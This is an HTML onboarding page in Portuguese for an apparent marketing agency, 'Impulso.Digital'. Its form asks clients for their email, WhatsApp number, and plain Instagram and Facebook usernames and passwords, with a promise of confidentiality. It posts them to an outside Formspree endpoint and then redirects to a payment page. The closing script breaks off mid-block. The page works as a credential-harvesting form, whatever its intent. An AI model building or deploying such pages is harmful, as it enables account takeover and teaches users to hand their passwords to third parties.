<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro de Acesso - Impulso.Digital</title>
    <link rel="stylesheet" href="style.css"> 
    <link rel="stylesheet" href="cadastro.css">
</head>
<body>

    <header>
        <div class="container">
            <h1 class="logo">Impulso<span class="logo-accent">.Digital</span></h1>
            <nav>
                <ul><li><a href="index.html">Voltar ao Site</a></li></ul>
            </nav>
        </div>
    </header>

    <section class="form-section">
        <div class="container">
            <h2>Dados de Acesso para Início Imediato</h2>
            <p class="subtitle-form">Para iniciarmos a gestão de suas campanhas e redes sociais, preencha os dados abaixo com segurança.</p>

            <form id="access-form" class="acesso-form" action="https://formspree.io/f/myznqdjq" method="POST">
                
                <fieldset>
                    <legend>Dados de Contato</legend>
                    <div class="form-group">
                        <label for="email">Seu Melhor Email *</label>
                        <input type="email" id="email" name="email" placeholder="exemplo@empresa.com.br" required>
                    </div>
                    <div class="form-group">
                        <label for="telefone">Número de Telefone (WhatsApp) *</label>
                        <input type="tel" id="telefone" name="telefone" placeholder="(DD) 9 XXXX-XXXX" required>
                    </div>
                </fieldset>

                <fieldset>
                    <legend>Dados do Instagram (Se já tiver conta)</legend>
                    <div class="form-group">
                        <label for="insta-user">Usuário do Instagram</label>
                        <input type="text" id="insta-user" name="insta-user" placeholder="@seuusuario">
                    </div>
                    <div class="form-group">
                        <label for="insta-pass">Senha do Instagram</label>
                        <input type="password" id="insta-pass" name="insta-pass" placeholder="Senha da sua conta">
                        <small class="aviso-seguranca">Garantimos o sigilo total das suas credenciais.</small>
                    </div>
                </fieldset>

                <fieldset>
                    <legend>Dados do Facebook/Meta (Usuário com Acesso à Página)</legend>
                    <div class="form-group">
                        <label for="face-user">Usuário ou Email do Facebook</label>
                        <input type="text" id="face-user" name="face-user" placeholder="Nome de usuário ou email de login">
                    </div>
                    <div class="form-group">
                        <label for="face-pass">Senha do Facebook</label>
                        <input type="password" id="face-pass" name="face-pass" placeholder="Senha de login">
                        <small class="aviso-seguranca">Usaremos isso para configurar seu Gerenciador de Negócios.</small>
                    </div>
                </fieldset>

                <button type="submit" class="btn btn-primary btn-submit">Enviar Dados e Iniciar</button>

                <p class="final-warning">Se preferir não informar a senha aqui, clique em "Voltar ao Site" e entre em contato conosco por WhatsApp para combinarmos o acesso de forma alternativa.</p>
            </form>
        </div>
    </section>

    <footer>
        <div class="container">
            <p>© 2025 Agência Impulso.Digital. Todos os direitos reservados.</p>
        </div>
    </footer>

    <script>
        const form = document.getElementById('access-form');
        form.addEventListener('submit', async (event) => {
            event.preventDefault();

            const formData = new FormData(form);
            const response = await fetch(form.action, {
                method: form.method,
                body: formData,
                headers: { 'Accept': 'application/json' }
            });

            if (response.ok) {
                window.location.href = 'pagamento.html';
            } else {
                alert('Ocorreu um erro ao enviar o formulário. Tente novamente.');
